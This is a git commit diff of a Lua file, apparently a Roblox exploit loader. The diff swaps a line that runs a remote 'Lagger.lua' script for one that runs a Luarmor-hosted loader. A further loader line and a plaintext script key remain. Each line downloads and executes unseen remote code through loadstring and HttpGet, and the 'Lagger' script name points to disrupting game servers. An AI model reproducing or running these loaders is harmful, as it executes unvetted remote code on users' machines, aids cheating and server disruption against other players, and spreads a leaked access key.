b719d5a59227cae3126a0a3119bae98253c63f08
github <minineje9900@gmail.com>
2026-08-19 17:58:06 +0200

    Uploaded by Stick Loadstring Generator

--- Irish.lua
+++ Irish.lua
@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rblx-api/loader/main/Lagger.lua"))()
-
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/617eeb85446f3f6fd45997e7e856d9d6.lua"))()
 script_key="FdHcPXslksGPEvqInyJTWvyTdNTsAiDa";
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/8cd20b0d901ef0a19f1757f6ec29cd31.lua"))()
